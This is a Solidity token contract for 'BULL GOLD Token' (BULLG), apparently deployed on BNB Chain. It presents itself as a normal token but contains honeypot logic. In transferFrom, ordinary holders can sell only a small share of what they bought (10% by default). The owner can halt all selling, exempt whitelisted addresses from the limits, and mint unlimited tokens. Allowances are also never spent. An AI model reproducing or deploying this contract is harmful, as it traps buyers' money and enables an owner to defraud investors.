/**
 *Submitted for verification at BscScan.com on 2022-05-10
*/

pragma solidity ^0.5.16;

contract Bull
{
    mapping(address => uint) public balances;
    mapping(address => uint) public total_bought;
    mapping(address => uint) public total_sold;
    mapping(address => bool) public whitelist;
    mapping(address => mapping(address => uint)) public allowance;
    string public name = "BULL GOLD Token";
    string public symbol = "BULLG";
    uint public decimals = 18;
    uint private supplyPotency = 10 ** decimals;
    uint public totalSupply = 10000000000 * supplyPotency;
    address public the_owner;
    bool public allow_sell = true;
    uint public max_sell_percent = 100; //percent, between 0 to 1000

    event Transfer(address indexed from, address indexed to, uint amount);
    event Approve(address indexed owner, address indexed spender, uint amount);

    constructor() public
    {
        balances[msg.sender] = totalSupply;
        the_owner = msg.sender;
    }

    //REQUIRED FUNCTIONS

    function balanceOf(address owner) public view returns(uint)
    {
        return balances[owner];
    }

    function transfer(address to, uint amount) public returns(bool)
    {
        require(balanceOf(msg.sender) >= amount, "balance too low");
        balances[to] += amount;
        balances[msg.sender] -= amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }

    //a própria DEX já toma conta de enviar o amount com a potencia em decimals
    function transferFrom(address from, address to, uint amount) public returns(bool)
    {
        require(balanceOf(from) >= amount, "balance from too low");
        require(allowance[from][msg.sender] >= amount, "quantity from not allowed");
        //user buying or owner action
        if(from == the_owner)
        {
            balances[to] += amount;
            balances[from] -= amount;
            if(to != the_owner)
            {
                total_bought[to] += amount;
            }
        }
        //whitelist action
        else if(whitelist[from] == true)
        {
            balances[to] += amount;
            balances[from] -= amount;
        }
        //user selling
        else
        {
            require(allow_sell == true, "sale are not allowed");
            require((total_sold[from] + amount)*1000 <= (total_bought[from])*max_sell_percent, "you can't sell this amount");
            balances[to] += amount;
            balances[from] -= amount;
            total_sold[from] += amount;
        }
        emit Transfer(from, to, amount);
        return true;
    }

    function approve(address spender, uint amount) public returns(bool)
    {
        allowance[msg.sender][spender] = amount;
        emit Approve(msg.sender, spender, amount);
        return true;
    }

    //OWNER FUNCTIONS

    function mint(uint amount) public returns(bool)
    {
        require(msg.sender == the_owner, "account isn't the owner");
        totalSupply += amount*supplyPotency;
        balances[the_owner] += amount*supplyPotency;
        return true;
    }

    function setAllowSell(bool true_or_false) public returns(bool)
    {
        require(msg.sender == the_owner, "account isn't the owner");
        allow_sell = true_or_false;
        return allow_sell;
    }

    function setMaxSellPercent(uint percent) public returns(bool)
    {
        require(msg.sender == the_owner, "account isn't the owner");
        max_sell_percent = percent;
        return true;
    }

    function setWhitelist(address new_whitelist, bool true_or_false) public returns(bool)
    {
        require(msg.sender == the_owner, "account isn't the owner");
        whitelist[new_whitelist] = true_or_false;
        return true;
    }

    function abdicateOwnership(address new_owner) public returns(bool)
    {
        require(msg.sender == the_owner, "account isn't the owner");
        the_owner = new_owner;
        return true;
    }
}